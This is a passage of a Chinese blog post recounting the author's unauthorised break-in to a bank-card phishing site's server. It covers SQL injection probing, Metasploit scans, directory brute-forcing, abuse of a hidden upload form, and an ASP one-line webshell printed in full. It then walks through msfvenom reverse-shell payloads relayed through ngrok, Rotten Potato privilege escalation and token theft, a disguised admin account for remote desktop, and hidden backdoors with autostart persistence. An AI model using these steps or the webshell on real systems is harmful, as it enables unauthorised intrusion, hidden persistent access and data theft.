<code>Burp</code>，拦截一下之前提交银行卡号密码的表单数据：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/302a800d0aa5d21c68c455131b095938.png" alt="burp-form-field"></p><p>然后对字段值进行简单注入尝试，检查报错信息：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f8bda2bb8aaeaea3cda51e950261910e.png" alt="burp-sql-inject-simple"></p><p>没反应，应该是有基础校验，再换个：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8568699eada7b7b5e1e88b8e9805e19d.png" alt="burp-sql-inject-union-select"></p><p>有反应，似乎看到了希望，虽然返回乱码了，应该是对方程序处理问题，不过看句式像是 SQL 报错，又接连试了几个，也是同样的返回，那么剩下的冗杂工作，就交给工具进行吧，掏出 <code>sqlmap</code> 跑一波：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0da9a66b9cd6c0dc6fdd9ba56931e813.png" alt="cmd-sqlmap"></p><p>后面换了几轮参数也没成功，应该是过滤机制比较周到，然后在测试另一个页面时，才发现了那段报错信息的原本含义：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/4f28761d17a67ad888090fe17d8b7d57.png" alt="burp-sql-inject-err-res"></p><p>嗯还是太年轻，会错意了，应该是程序识别到了字段值中的 SQL 关键字；另外回想起之前扫描到服务可能隐含 <code>TRACE</code> 相关漏洞，测试了下，应该是服务端暂未支持：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/6029c9633748238aa41a6becdfb9a0db.png" alt="burp-trace-method"></p><p>然后又想了想，针对密码字段进行数据库表字段设计时，应该会考虑其字符位数低的特点，减少空间占用，因为这是银行卡密码，都知道是 6 位数字，这里传个大数看看有没有惊喜：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0831994a08dc2a0d4644d0965b1a6f30.png" alt="burp-post-mass-data"></p><p>尴尬，是有惊无喜，应该是没有特别处理，直接反馈为服务端错误；后面又陆续换了几个页面，测试下来都没太大收获，场面又一度陷入僵局，只能又暂时转移战场；</p><h3 id="0x002-Metasploit-渗透"><a href="#0x002-Metasploit-渗透" class="headerlink" title="0x002 Metasploit 渗透"></a>0x002 Metasploit 渗透</h3><p>终于到 <code>Metasploit</code> 出场了，蓄势待发，</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e7601b114dc9655b6ac3cffc0f02fa4c.png" alt="msf-banner"></p><p>先搜一下 IIS 的已知漏洞：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c91fd1a62175d80190a7ac107f724825.png" alt="msf-search-iis"></p><p>有不少，那就先调几个条件匹配的试一波，这里只放个示例，就不一一展示了：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/440726e3b1f9df550c0e09404dc4ba1f.png" alt="msf-run-ektron"></p><p>然后就是其他几个端口、服务，挨个测试一遍，也没有什么突破，看来补丁都打的挺全；目前又暂时陷入了死胡同，虽然 msf 还有不少模块可以利用，不过暂时不准备继续深入试探了，因为想起来还有另外一件重要的事情还没做；</p><h3 id="0x003-站点目录枚举"><a href="#0x003-站点目录枚举" class="headerlink" title="0x003 站点目录枚举"></a>0x003 站点目录枚举</h3><p>站点目录扫描，这件重要的事怎么能少得了，可供选择的工具很多，如 <code>dirbuster</code> 等，这里我们使用 <code>Burp Suite</code> 的 <code>Engagement tools</code> 里的 <code>Discovery content</code> 工具，进行目录爆破：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b878830935bdb663725a355830f34f48.png" alt="burp-dirbus-menu"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/c705a0ca56f0928994a063cf419fd2a6.png" alt="burp-dirbus-config"></p><p>其内置的大量字典已经足够使用了，不过涉及网络请求，这个过程也是异常漫长，不过可以后台跑着，不影响做其他事，这里就直接贴一个扫描结果：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/3f5bd22f58cee869c2afc9776f69d250.png" alt="burp-dirbus-sitemap"></p><p>直呼好家伙！不扫不知道，出来吓一跳，居然错过了这么多隐藏入口，小本本记下先，后续挨个探索，不过呢视线情不自禁地锁定到了名为 <code>upload.asp</code> 这个文件上，开发者这么明显的暗示就无需我多言了（ㄟ( ▔, ▔ )ㄏ）；</p><p><img src="https://img-blog.csdnimg.cn/img_convert/20d2f4855235d7d13f972b98ca499d2a.png" alt="burp-upload-get"></p><p>直接访问没什么返回数据，难道是方法不对？换成 <code>POST</code> 表单文件数据再试试：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/6cf25a1b18ec2531643e80cdff97d9f7.png" alt="cmd-curl-upload-file"></p><p>看来这样上传也没用，也许还要额外的校验参数之类的，上面不是刚扫了一堆没见过的页面嘛，现在回过头去挨个分析下页面源码看看，也许会有收获：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/6147aec0750a120b4a424563161d4df0.png" alt="front-upload-source"></p><p>果然，在其中一个页面中，发现了调用这个上传接口的表单，是个隐藏元素，结合页面内容，应该是用于收集用户上传的某些证件信息，身份证照片之类的，然后看了对应的 js 源码，果然存在一些校验和接口参数：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/be5a2f453b02e1a0358e554c21118aa6.png" alt="front-upload-js-fn"></p><p>这里去分析调用这些函数再上传文件太费劲了，这不是个隐藏表单嘛，直接改下代码通过 UI 操作多轻松 (¬‿¬)：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0ab612a311cb1523c80b0c949882bec4.png" alt="front-upload-show-form"></p><p>样子虽然简陋了点，管他的，能跑起来就行了，上传个文件试试：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f4c6aaf2c3f6bba0451172cad2be15d7.png" alt="front-upload-done"></p><p>然后再访问看看效果：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/23178a810d49fe1ad464c24e07010aae.png" alt="front-upload-access"></p><p>好家伙，大写的激动！嘴角再度微微上扬，不过先冷静下，再试试有没有文件类型校验，服务是 <code>ASP.NET</code> 的，那就简单传个 asp 程序试试，下面的代码会在页面输出站点运行服务的名称：</p><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;% response.write(Request.ServerVariables(&quot;SERVER_SOFTWARE&quot;)) %&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后上传上去看看：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/7f49dd3dc7fc6573e04dae97f536a9b0.png" alt="front-upload-asp-info"></p><p>这……俺还能说什么呢，此时无声胜有声 <code>$_$</code> ，不过这并不是终点，这只是一个良好的起点，一切才刚刚开始 (¬‿¬)；</p><h3 id="0x004-意外收获"><a href="#0x004-意外收获" class="headerlink" title="0x004 意外收获"></a>0x004 意外收获</h3><p>其实网站目录中还有一个很让人在意，就是叫 <code>jieliuzi</code> 这个目录，虽然摸透了对象开发者喜欢汉语拼音命名的习惯，但是这个含义始终未能参透，连蒙带猜外加输入法都未得其解，甚至后面进去一探究竟后没没想明白 <code>=_=</code>，中华文化真是博大精深；不管了，看看页面访问结果：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c4bef9177ff0256aa4dad52f4b0090cd.png" alt="front-jieliuzi-login"></p><p>是个登录页，十分简洁，而且这其实是个 PC 站点页，骗子在某些方面也挺有情调的，这里不作展示是由于整图过于刺激（怎么说呢，额，这登录框真白），怕过不了审；另外，注意一下这个网页最上面的标题名，第一反应就是应该不会是简单的字面意思，听着也不像啥好词儿，为此专门去百度了一下：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/12dc84c84add94b1d07107db3d6f379e.png" alt="front-whaling-meaning-1"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/a1ba596c8eca9db9d5a541e4ab86f2f8.png" alt="front-whaling-meaning-2"></p><p>em……又长见识了，原来诈骗也能是一门学问，再结合最开始那张二维码的来源（企业邮件），看来是这么个意思了，大家平时也都<strong>注意警惕</strong>一下；</p><p>随后试了下登录，没有验证码或超时超次数验证这些，并且也没挖掘到可利用的 SQL 注入点，这种情况就该 <code>Burp</code> 的 <code>Intruder</code> 出场了，后台登录名一般都是 <code>admin</code>，密码就祭出 <code>rockyou.txt</code> 跑一波先：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8c5bd59cc4fa9532a054ee5f3f084017.png" alt="burp-jieliuzi-intruder-config"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/e6af5c6f40b5c7ccde58ed9a74a50c43.png" alt="burp-jieliuzi-intruder-running"></p><p>这也是一个比较漫长的过程，不过一会儿之后再去看的时候就发现了变化：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e0626c5eb0a01738781a3d7a99db354e.png" alt="burp-jieliuzi-intruder-sql-warn"></p><p>需要留心的就是这里的返回数据长度，因为正常讲大部分试的密码都是错误的，服务器响应的数据大小也都是一样的，突然出现不一样的长度多半就出现了转机，这里看来是识别出了 sql 语句，和之前一样报错，然后看最上面那条：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/138aaa96102f0c8b51fa8ec02d92e86f.png" alt="burp-jieliuzi-intruder-find"></p><p>整个列表中就这一条最特别，看返回也是 302 重定向，看来应该是密码对了跳转进页面了，然后看这密码，也是够随意的，看着简单，猜的时候谁又能想到呢，登录进去看看：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/2ff0ec6f08fc719996181db6c2be083e.png" alt="front-jieliuzi-order-list"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/5a90484bd36710c588c1353cf843be27.png" alt="front-jieliuzi-ip-list"></p><p>……，唉，怎么说呢，应该是触目惊心吧，虽然数量没有一些媒体平台时不时报道那些的那么夸张，但也不是一个小数目了，而且每一处记录的银行卡账号、密码、身份证号、手机号、验证码、IP位置这些，都是近乎真实的；我不是正义的制裁者，也没有多少执行正义的力量，最多就热心的帮他们删个库再跑路，个人的力量太小了，所以这些还是都后面交给警察蜀黍处理吧，正义可能会迟到，但不会缺席。</p><h2 id="0x03-获取权限"><a href="#0x03-获取权限" class="headerlink" title="0x03 获取权限"></a>0x03 获取权限</h2><h3 id="0x001-Get-webshell"><a href="#0x001-Get-webshell" class="headerlink" title="0x001 Get webshell"></a>0x001 Get webshell</h3><p>暂时先抛开题外话，上面进行到了文件上传这一步，文件上传可以意味着很多事情，可执行文件的上传便可以实现获取服务器的系统操作权限，当然这里的网页应用程序的相关权限一版很低，提权的事就是后话了；当前任务是拿下网站操作权限，即 <code>webshell</code>，继续走流程，先上传个简单的 asp 版<strong>一句话木马</strong>：</p><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;% execute(request(&quot;pass&quot;)) %&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后就该 <strong>亮剑</strong> 了：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d2202af3b84d8959a2ea2afc9c940605.png" alt="antsword-add-data-menu"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/8d150a379dd79c5e591b54882270b708.png" alt="antsword-add-data-detail"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/68ff23b04af39ce9f15cf1f4f8cea8f6.png" alt="antsword-add-data-success"></p><p>搞定，进去康康：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/798cf01166447fd6e6ba9aeae0bb7eb5.png" alt="antsword-wwwroot-list"></p><p>文件相关操作：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e96a706718816f732f67a8bd96852ed2.png" alt="antsword-wwwroot-list-menu"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/c2877aa2960d9304a6e27b7d1723001a.png" alt="antsword-file-edit"></p><p>数据库相关操作（对应之前后台页面的展示数据）：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/816bdbe3efb9ed907bdf26b276e963e3.png" alt="antsword-db-bank"></p><p>命令行终端相关操作：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/acacf5491b371007aec9628e855783af.png" alt="antsword-cmd-home"></p><p>甚至获取 Windows 系统信息：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/6603300342b52e6fdb2540ac88b87f94.png" alt="antsword-cmd-systeminfo"></p><p>好了，这不啥都有了，还要啥自行车，但也不能止步于此，虽然现在拥有了对这整个站点的操作权限，包括文件及数据库的增删改查等，但也不至于为了正义用爱发电，每日蹲点删库删站，我们的目标还在山的那边 (ง •_•)ง</p><h3 id="0x002-Backdoor"><a href="#0x002-Backdoor" class="headerlink" title="0x002 Backdoor"></a>0x002 Backdoor</h3><p>俗话讲，要生于忧患，虽然现在入口打通了，但是凡事都要留一手（我更喜欢留多手），防止木马那天被管理员察觉并清理就尴尬了，所以找几个隐蔽的位置，再上传几个，比如平时几乎不被注意的 css 或图片等静态资源文件夹，js 库文件等，文件命名上也可以花点心思，模仿已有文件或者配置文件之类的，使人有一种一眼看上去是正常文件的幻觉（+_+）；</p><p><img src="https://img-blog.csdnimg.cn/img_convert/92437e2f9f922984e02cc3d03c6a764c.png" alt="antsword-backdoors"></p><p>当然，还可以利用一种技术，简单讲就是 Windows 中我们熟知的隐藏文件，一般一些软件或系统的配置文件会通过这样的方式隐藏，防止普通用户误删改，查看也能简单，像下面这样勾选一些就都出来了：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a4f97cd71db3db89ebd0055bf61e43fa.png" alt="antsword-explorer-hidden-file"></p><p>所以我们这里可以通过 shell 命令把指定文件隐藏掉，使得其不会被轻易发现：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/7893778f1b1e287c6bf4ee6b9dc86203.png" alt="antsword-cmd-attrib"></p><h3 id="0x003-Get-shell"><a href="#0x003-Get-shell" class="headerlink" title="0x003 Get shell"></a>0x003 Get shell</h3><p>目前我们获取到的还只是 <code>webshell</code>，虽然可以模拟执行终端命令，但是这些都是通过上传的 asp 后门程序执行的，就是说每步操作都会发起 http 请求，防止被平台记录，需要获取系统 <code>shell</code>，即上传系统可执行文件（如 <code>.exe</code> 文件，就是俗称的<strong>木马</strong>），至于如何生成，就需要 <code>metasploit</code> 再次登场了；</p><p>这里又涉及一些东西，getshell 的木马一般有两种，正向连接和反向连接，基础的认知可能是将程序上传至机器，然后运行就会后台监听某个端口，等待外部的连接，连上后就可以通过两端的交互达到控制系统，当然前提是系统防火墙没开或者允许该端口放行，而通常服务器都会开启防火墙并过滤端口，只放行指定的几个；</p><p>所以后面出现了第二种类型，反向连接，或者叫反弹 shell，简单讲就是第一种类型反转一下，不是目标机器等待我们连，而是我们外部的机器等待目标机器来连接，这解决了防火墙端口的限制，因为防火墙一般不会特意去限制出站端口，当然这种类型又增加了额外的限制，首先我们需要一台具有公网 IP 的机器，像平常这种连着 WiFi， 深埋于 n 层路由下的设备，基本可以放弃了（使用端口转发也需要运营商提供公网 IP），另外就是需要目前机器可访问公网，因为有些服务器考虑安全因为是在内外下的，用反向代理等方式传输流量，无法访问外网；</p><p>由于不清楚对方防火墙情况，先用反向连接看看，手边暂时没有公网机器，就先用 <code>ngrok</code> 转发一下端口流量，先启动服务：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b59e7314e81b6fc4f0e908ef25d811d1.png" alt="cmd-ngrok-running"></p><p>从之前收集的数据中得知，对方机器是 x64 Windows 系统，那么这里就直接用 <code>msfvenom</code> 生成对应的 <code>payload</code>（暂时先不考虑加密加壳这些，传上去看看是否被杀毒再说）：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/4334d9043acb14e4304eb17907739052.png" alt="cmd-msfvenom-generate-api"></p><p><code>reverse_tcp</code> 是反向连接，<code>bind_tcp</code> 是正向连接，连接地址填 ngrok 提供的链接，端口填链接对应的，然后生成执行文件，最后上传到对方站点某个隐蔽的目录下：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/ef2e60926dd67248c43b53c4a45238e8.png" alt="antsword-upload-api"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/1839fb16ce9193dae4b6e4ea77d0687b.png" alt="antsword-upload-api-success"></p><p>然后在 msf 中启动监听程序，等待对方连接，地址填本地，端口填之前 ngrok 中设定的本地端口，使用的 pyaload 要和之前 <code>msfvenom</code> 中配置的一致，不然会连接失败；完成后，一旦目标上的程序启动，首先就会访问 ngrok 域名和对应端口，ngrok 服务再把传输数据转发到本地的监听端口中，数据就通过这一层中介进行双向传输：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/81379e4c64cf9a8d276db494b7f29ce2.png" alt="msf-run-reverse-listener"></p><p>然后在 webshell 中执行它：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0576f7065162dacfff99d3cff3167044.png" alt="antsword-cmd-run-api"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/782b55555c578e837415ac89af46f458.png" alt="antsword-cmd-list-api"></p><p>运行成功，这是切换回 msf 一会后就会有所反应，表示连接成功：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/ba2645d282c9e6fac290c11e6f7822d5.png" alt="msf-reverse-connected"></p><p>现在再查看 ngrok 服务就回显示有一条连接，表示可以进行通信了：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/596058e521f24fd024d867742025062f.png" alt="cmd-ngrok-connected"></p><p>现在连接成功进入的操作界面是 <code>meterpreter</code>，这是 <code>metasploit</code> 提供的有许多拓展功能的集成终端，类似于 cmd、shell，但是功能更强大，可以执行切换目录、获取系统信息、操作进程、上传下载文件、进一步渗透等操作，甚至在拿下 system 权限后，还能解锁控制鼠标键盘、屏幕截图或实时预览等高级功能，这里先查询下基础信息：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9d908ddb2f4fbaa742e298ef6836c295.png" alt="meter-getinfo"></p><p>和之前的虚拟终端一样，当前操作用户是 IIS，当然这里想用 cmd 终端操作也是可以的，执行下 <code>shell</code> 命令进入系统 <code>shell</code>，操作和命令与系统命令提示符没有两样：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b44e3f21ad6e7b217925b7f9e8d02951.png" alt="meter-shell-command-test"></p><p>初次进入可能会出现中文字符乱码情况，因为 cmd 默认使用的字符集问题，手动切换成 UTF-8  的 65001 就行了，可能唯一不太方便的地方，就是没有集成历史记录的功能，要重试上个命令得全部重打一遍，毕竟是网络转发数据，不应要求太多：</p><h3 id="0x004-Get-system"><a href="#0x004-Get-system" class="headerlink" title="0x004 Get system"></a>0x004 Get system</h3><p>如上面所讲，目前获取到的只是普通账户的 <code>shell</code>，虽然有一定的终端操作权限，但还是远远不够的，会有诸多限制，比如无法操作一些服务、增删系统账户、访问系统目录等等，那么接下来的操作就是 <strong>shell 提权</strong>了，或者叫 getsystem，这也是 meterpreter 中的一条命令，功能和描述一样，会尝试多种漏洞进行权限提升以获取 <code>SYSTEM</code> 权限，只不过试了下似乎都没有成功，只能另寻他法：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d000c9c1bef9f90f8f818ea876333ae5.png" alt="meter-getsystem-err"></p><p>这里值得说的是，可能有小伙伴会有疑惑，认知中 Windows 系统中权限最高的不应该是超级管理员 <code>Administrator</code> 吗，为什么一直在强调获取 <code>SYSTEM</code> 账户权限，其实严格来讲，Administrator 账户虽然成为管理员，其实权限并不是最高的，也有很多它做不了的事，举个简单的例子就是删除系统账户 <code>Guest</code>：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/22de2396f6e238c277c6e8bb219970ff.png" alt="cmd-admin-del-guest"></p><p>以及其他一些系统层面的事，administrator 也做不到，而这些高层次的操作都由 <code>SYSTEM</code> 账户来完成，虽然在账户设置里面从没见过它，但它是确确实实存在的：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/65dad55aff53b181a1579227d45d8ec5.png" alt="explorer-system-account"></p><p>就像网站服务其实也有个对应的 www 账户一样，应该没人曾经登录过它吧；</p><p>前面讲获取 system 权限使用 <code>getsystem</code> 不奏效，那么就继续试探一下其他路子，也就是<strong>令牌窃取</strong>，令牌指的登录令牌，类似登录网站要用的 <code>cookies</code> 或者 <code>token</code>，而 Windows 中存在两种令牌：<code>Delegation Tokens</code>（授权令牌） 和 <code>Impersonation Tokens</code>（模拟令牌），前者用于交互式的登录，如直接或使用远程桌面，输入账号密码登录进系统，而后者用于非交互式的会话中，访问网络驱动或其他域登录脚本程序；</p><p>这里要利用的正是模拟令牌，窃取的过程有些类似网站里的 cookies 窃取，由于令牌在重启系统之前，会一直被保留，所以有账户登陆过的话，其令牌有机会被冒充使用，而且有授权令牌登录的账户注销的话，令牌也会转化为模拟令牌，同时其原本的相关权力都会保留；</p><p>这里接下来就先使用 <code>incognito</code>（伪装、隐瞒的意思，偷盗者总是会先隐藏起来嘛）插件，进行令牌盗取，再用 <code>list_token</code> 命令查询当前能获取的令牌情况（数量因当前的 shell 权限而定）：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/de2c873714be2f42669262b201e07d8a.png" alt="meter-list-tokens"></p><p>这里可以看到可盗取令牌的账户，要窃取的话就使用 <code>impersonate_token</code> 命令：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/98668a03e33ea01413e04d76bbc69ff4.png" alt="meter-impersonate-iusr"></p><p>虽然可以窃取成功，但试了下这个账户的权限也不高，尝试性的试了下 system 账户也失败：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/3634817a6458e1f75b41212d3bb8b56e.png" alt="meter-impersonate-try-system"></p><p>所以只能再尝试其他提权漏洞了，这里就先用 <code>bg</code> 命令把当前 meterpreter 会话切换至后台，回到 msf 界面，使用一个已知的 <code>Rotten Potato</code> 提权漏洞：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/7f05f72f8b731fbbed0ca140bef9d7a1.png" alt="msf-use-rotten-potato"></p><p>需要的唯一参数是会话 id，正好可以利用刚才的 meterpreter 会话，然后还需要设置一个 payload，这里之前有了解过，目前机器可以访问公网，而且虽然有使用防火墙过滤端口，但是似乎一直开着这么一群端口：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/50c5b100f3c7b8f971790d86219c4350.png" alt="meter-netstat"></p><p>这是远程 RPC 需要使用的一系列端口，所以盲猜机器会开放 <code>49150-49160</code> 这么一个范围的端口，那么就见缝插针，选一个没被占用的用于开启监听，这样就能直接使用正向连接了，而不用麻烦的再次使用反向连接：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/201a372894dddaa85ac8330f3e5f609c.png" alt="msf-config-rotten-potato"></p><p>地址填目标机器的地址，这样运行后就能自动连接到目标机器的监听端口上，这里先运行一下试试能不能成功：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/ec082097d3fac9016a9a196e18416d5a.png" alt="msf-run-rotten-potato-success"></p><p>哟西！竟然比想象中的顺利，就不多解释了，检查一下权限和令牌先：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/28d2b9bdbd83f1a21bfe822930bf1ba0.png" alt="msf-rotten-potato-getsystem-success"></p><p>Nice，成过窃取到了 system 账户的令牌，以对方身份登录成过，接下来就可以试试权限了：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c75111442ded69caf47426edcd7a12ea.png" alt="meter-shell-system-add-user"></p><p>进入 shell 后账户确实变成了 SYSTEM，也能增加或删除账户了，那么至此，成过拿下系统最高权限，成功 getsystem；</p><h3 id="0x005-权限测试"><a href="#0x005-权限测试" class="headerlink" title="0x005 权限测试"></a>0x005 权限测试</h3><p>回想起前面有说过，高权限可以获取屏幕截图或者实式预览，那么这里来就看一下下：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/04c040120e8dd1250193e93e86d970a8.png" alt="meter-screenshot-saved"></p><p>成功截图到了指定文件，打开看看：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b6ab19e276625531c480189b2151441c.png" alt="meter-screenshot-view"></p><p>虽然分辨率有点低，但大致是个登录界面的模样，然后实时预览看看，由于这个要启动图形服务，就在虚拟机里跑一下：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e0b6dafaee6d510b0b3714e28ff0c5a5.png" alt="meter-screenshare"></p><p>大晚上的，应该没啥人登录，，不过光是预览还不够，现在是可以直接远程登录进去的，只是需要额外的一些操作，先建立一个账户并分配管理员权限（即加入 <code>Administrators</code> 用户组），名字同样可以取得有一定迷惑性：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c74ab2f32842ca657cc552ec2bdfe662.png" alt="meter-add-user-sys"></p><p>不过光是这样还仍没有远程登录的权限，需要将用户分配进远程桌面用户组才具有登录权限：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/7ec802090186e478d1beada96f083c3a.png" alt="meter-add-sys-rdp"></p><p>然后这里本来是要开启远程桌面服务的（<code>TermService</code>），结果查询发现是已经开启的，然后一路追踪到了服务对应的进程，进程对应的端口：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/ab5f4a5abc355960370a2ebdd7f5fcc3.png" alt="meter-shell-find-termservice"></p><p>居然默认端口从 3386 改成了 10086，有意思，之前端口扫描默认常用端口，难怪没有扫出来，既然现在用户和密码都有了，登录进去看看：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/328e0e68c577f88b5006c767fee66300.png" alt="rdp-connect-pannel"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/4476b10573d23f791824999e67dbc088.png" alt="rdp-connecting"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/6280eda3851d9c7b5574371c2c57afff.png" alt="rdp-desktop-view"></p><p>唉，都舍不得掏钱整台配置好一点的，一点都不懂得投资 ㄟ( ▔, ▔ )ㄏ，没意思，擦擦屁股溜了溜了(～￣▽￣)～；</p><h3 id="0x005-System-Backdoor"><a href="#0x005-System-Backdoor" class="headerlink" title="0x005 System Backdoor"></a>0x005 System Backdoor</h3><p>老规矩，任何阶段都需要留一手，并且现在 system 权限，因此只要留下后门那么再次连接就直接具有 system 权限，那么话不多说直接上传，文件名同样可以取得有一定迷惑性：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/cddd4b926408cbd435cc66f080535766.png" alt="meter-upload-conf"></p><p>然后配置程序开机启动：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/fabb2941bc7d64039abf46956ec1c0e5.png" alt="meter-shell-reg-add"></p><p>当然，要想再留一手就可以再创建个系统服务，只是生成的 payload 要用 service 类型的，不然会启动失败：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9c03e1304a1ed949a460c1151bb3922d.png" alt="cmd-gen-payload-exe-service"></p><p>然后上传后在目标机器创建服务，配置开机自启，也可以再额外配置启动失败后自动重启服务，或者最近调用执行其他程序，最后再手动启动一次服务：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/4841c0e75177b1a1738983fcfb2d3ed8.png" alt="meter-shell-sc-create"></p><p>至此，大部分流程基本结束，拥有系统权限可以做更多的拓展渗透，这些都是后话；</p><h2 id="0x04-套路分析"><a href="#0x04-套路分析" class="headerlink" title="0x04 套路分析"></a>0x04 套路分析</h2><h3 id="0x001-作案工具"><a href="#0x001-作案工具" class="headerlink" title="0x001 作案工具"></a>0x001 作案工具</h3><p>目前为止一共收集到两个后台，一个宝塔面板和一个捕鲸系统后台，宝塔之前是由于有登录校验，没有获取到登录入口，现在就轻松了，用宝塔自带命令 <code>bt default</code> 查看一下默认入口和账号信息：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/02241e0504f3c0866d6c1ec34cb20870.png" alt="meter-baota-default"></p><p>额……者用户名难道是要暗示自己输得起？待会用这个账号和密码登进去看看，另外在查看目录时，又发现了有意思的部分：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8f61ea206de3cb03669c7ff6b8ec2db3.png" alt="meter-baota-hosts-list"></p><p>这里还列出了不少站点，难道现在诈骗也搞分布式作案了 ( $ _ $ )，或者微诈骗？算了后面有机会再去一锅端了，先登录进去看看：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/597b8572bf66bd35dc0c557ee0ed8a83.png" alt="front-baota-login-default"></p><p>看了默认密码被换调了，虽然现在有权限能直接改掉密码，为了不打草惊蛇，就先放一放，反正进去也都是一些可视化服务器配置，毕竟现在服务器的系统权限都攥在手上呢，不必着急，主要先分析下另外一套系统，那才是骗子们的主要作案工具；</p><p>可以观察页面存在两列功能栏，分别罗列着骗子能远程执行的操作：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/58fc2b0f520bb3f959acb3786cc62df3.png" alt="front-jieliuzi-func-1"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/363701b7abe8355e2ab7a66ef85d08c8.png" alt="front-jieliuzi-func-2"></p><p>两列功能类似，只有个别区别，这里贴个图对比一下，感觉功能 2 应该是 1 的升级版，多加了几个功能，不过后面发现并不是这么简单，二者都能使用，这样是为了方便骗子连环套取用户信息：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5dc85e692ba078a62f72268497027b01.png" alt="front-jieliuzi-func-compare"></p><h3 id="0x002-诈骗流程"><a href="#0x002-诈骗流程" class="headerlink" title="0x002 诈骗流程"></a>0x002 诈骗流程</h3><p>最前面的捕鲸邮件这些就不说了，就是邮箱盗号后广发邮件撒网罢了，现在主要来看下上面的一堆功能项，为了行骗过程操作方便，大部分功能应该都是字面意思，还记得最开始审查页面的时候，最后是停在了一个加载页上面，那么应该就是衔接这里的操作的，不同的功能项会触发不同的返回结果：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d2f0375b558b747059b6f127c367185d.png" alt="front-submit-loading"></p><p>这里空讲可能没什么概念，功能汇总有十几二十 个，就挨个给大家实际演示一遍，从骗子的视角过一遍大致就能体会了，还是用之前的表单数据提交，然后这部触发不同的功能后回去看结果：</p><h4 id="“未通过”"><a href="#“未通过”" class="headerlink" title="“未通过”"></a>“未通过”</h4><p>未通过就是上面的加载页面，是默认状态，也是处理不通过返回之前的中转页面；</p><h4 id="“通过–杀它”"><a href="#“通过–杀它”" class="headerlink" title="“通过–杀它”"></a>“通过–杀它”</h4><p>标记通过后会跳转提交验证码的页面，这里获取验证码只是个幌子，真实情况是骗子在向银行发起请求获取验证码，然后骗取用户提交：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/57150b5a30b18917eae26a245523f8b5.png" 